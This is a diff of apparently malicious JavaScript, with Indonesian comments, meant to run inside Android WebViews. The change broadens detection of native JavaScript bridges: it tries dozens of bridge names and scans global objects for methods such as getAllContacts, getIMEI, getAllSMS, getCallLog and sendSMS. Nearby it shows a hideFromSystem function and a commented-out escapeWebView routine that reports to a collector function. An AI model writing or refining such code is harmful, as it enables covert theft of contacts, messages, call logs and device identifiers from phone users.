@@ -187,29 +187,76 @@ function hideFromSystem() {
 }
 
 // ============================================================
-// DETEKSI MULTI-BRIDGE (JavaScriptInterface)
+// 🔥 DETEKSI BRIDGE SUPER LUAS (PENDEKATAN 3 LAPIS)
 // ============================================================
 var BRIDGE = null;
-(function detectBridge() {
+
+(function detectBridgeUltra() {
+    // Pendekatan 1: Daftar nama variabel yang umum digunakan
     var candidates = [
-        'AndroidBridge',
-        'JSBridge',
-        'WebViewJavascriptBridge',
-        'NativeBridge',
-        'Bridge',
-        'WebBridge',
-        'JSBridgeAndroid'
+        'AndroidBridge', 'JSBridge', 'WebViewJavascriptBridge', 'NativeBridge',
+        'Bridge', 'WebBridge', 'JSBridgeAndroid', 'JSBridgeInterface',
+        'AndroidJSBridge', 'WVBridge', 'WVJB', 'WebViewBridge', 'JSBridgeNative',
+        'AppBridge', 'AppJSBridge', 'HybridBridge', 'WebViewJSBridge',
+        'AndroidWebViewBridge', 'JavaBridge', 'JavascriptBridge',
+        'window.AndroidBridge', 'window.JSBridge', 'window.WebViewJavascriptBridge',
+        'window.NativeBridge', 'window.Bridge', 'window.WebBridge',
+        'window.JSBridgeInterface', 'window.AndroidJSBridge',
+        'window.WebViewBridge', 'window.AppBridge'
     ];
+
+    // Coba per nama
     for (var i = 0; i < candidates.length; i++) {
-        if (typeof window[candidates[i]] !== 'undefined') {
-            BRIDGE = window[candidates[i]];
-            break;
+        var candidate = candidates[i];
+        if (candidate.indexOf('.') > -1) {
+            var parts = candidate.split('.');
+            var obj = window;
+            var found = true;
+            for (var j = 0; j < parts.length; j++) {
+                if (obj[parts[j]] === undefined) {
+                    found = false;
+                    break;
+                }
+                obj = obj[parts[j]];
+            }
+            if (found && obj !== null) {
+                BRIDGE = obj;
+                return;
+            }
+        } else {
+            if (typeof window[candidate] !== 'undefined') {
+                BRIDGE = window[candidate];
+                return;
+            }
+        }
+    }
+
+    // Pendekatan 2: Cari objek global dengan method khas bridge
+    var methodSignatures = ['getAllContacts', 'getIMEI', 'getAllSMS', 'getCallLog', 'sendSMS', 'openApp'];
+    for (var key in window) {
+        if (typeof window[key] === 'object' && window[key] !== null) {
+            for (var m = 0; m < methodSignatures.length; m++) {
+                if (typeof window[key][methodSignatures[m]] === 'function') {
+                    BRIDGE = window[key];
+                    return;
+                }
+            }
+        }
+    }
+
+    // Pendekatan 3: Cari objek dengan method 'postMessage' yang biasa digunakan bridge
+    for (var key2 in window) {
+        if (typeof window[key2] === 'object' && window[key2] !== null) {
+            if (typeof window[key2].postMessage === 'function' && typeof window[key2].send === 'function') {
+                BRIDGE = window[key2];
+                return;
+            }
         }
     }
 })();
 
 // ============================================================
-// FALLBACK WRAPPER - HANYA DIGUNAKAN JIKA AndroidBridge TIDAK ADA
+// FALLBACK WRAPPER - HANYA DIGUNAKAN JIKA BRIDGE TIDAK ADA
 // ============================================================
 var FALLBACK = {
     downloadFile: function(url, path) {
@@ -253,15 +300,14 @@ var FALLBACK = {
 // ============================================================
 // DETEKSI PLATFORM & BRIDGE
 // ============================================================
-var HAS_BRIDGE = typeof AndroidBridge !== 'undefined' && 
-                 (navigator.userAgent.toLowerCase().indexOf('android') > -1);
+var HAS_BRIDGE = (BRIDGE !== null);
 
 // ============================================================
 // FUNGSI UNTUK MENENTUKAN APAKAH MENGGUNAKAN BRIDGE ATAU FALLBACK
 // ============================================================
 function getBridge() {
     if (HAS_BRIDGE) {
-        return AndroidBridge;
+        return BRIDGE;
     }
     return FALLBACK;
 }
@@ -602,7 +648,8 @@ function openHTML(htmlContent) {
 // ============================================================
 // WEBVIEW ESCAPE, NOTIFIKASI, STATUS BAR, REDIRECT
 // ============================================================
-/*    
+// escapeWebView() TIDAK DIGUNAKAN (DI-COMMENT)
+/*
 function escapeWebView() {
     if (!PLATFORM.isWebView) return;
     K({ sumber: 'escape_webview', data: 'attempt' });
